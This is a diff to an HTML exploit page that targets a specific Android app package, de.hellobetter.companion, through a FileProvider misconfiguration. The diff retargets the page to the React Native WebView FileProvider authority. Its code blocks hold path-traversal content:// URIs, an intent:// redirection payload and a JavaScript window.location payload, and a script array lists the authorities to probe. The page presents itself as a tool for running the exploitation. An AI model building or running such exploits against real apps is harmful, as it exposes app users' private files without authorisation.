@@ -223,7 +223,8 @@
             <div class="target-info">
                 <h2>🎯 Target Application</h2>
                 <p><strong>Package:</strong> de.hellobetter.companion</p>
-                <p><strong>Vulnerability:</strong> Insecure FileProvider Configuration (path=".")</p>
+                <p><strong>FileProvider:</strong> com.reactnativecommunity.webview.RNCWebViewFileProvider</p>
+                <p><strong>Vulnerability:</strong> React Native WebView FileProvider Misconfiguration</p>
                 <p><strong>CVSS Score:</strong> 8.1 (High)</p>
             </div>
 
@@ -254,8 +255,8 @@ Click "Start FileProvider Exploitation" to begin testing.
                         <h4>1. Content Provider Access</h4>
                         <p>Direct access through content:// URIs</p>
                         <div class="code-block">
-content://de.hellobetter.companion.fileprovider/shared/Download/
-content://de.hellobetter.companion.fileprovider/shared/../Documents/
+content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Download/
+content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../Documents/
                         </div>
                     </div>
 
@@ -263,7 +264,7 @@ content://de.hellobetter.companion.fileprovider/shared/../Documents/
                         <h4>2. Intent Redirection</h4>
                         <p>Android Intent-based exploitation</p>
                         <div class="code-block">
-intent://de.hellobetter.companion.fileprovider/shared/../#Intent;scheme=content;end
+intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
                         </div>
                     </div>
 
@@ -271,7 +272,7 @@ intent://de.hellobetter.companion.fileprovider/shared/../#Intent;scheme=content;
                         <h4>3. WebView Exploitation</h4>
                         <p>JavaScript-based WebView attacks</p>
                         <div class="code-block">
-window.location = "content://de.hellobetter.companion.fileprovider/shared/../";
+window.location = "content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../";
                         </div>
                     </div>
                 </div>
@@ -305,6 +306,7 @@ Android/data/com.android.chrome/ - Chrome data
         let totalTests = 0;
 
         const authorities = [
+            "com.reactnativecommunity.webview.RNCWebViewFileProvider",
             "de.hellobetter.companion.fileprovider",
             "de.hellobetter.companion.SharingFileProvider"
         ];
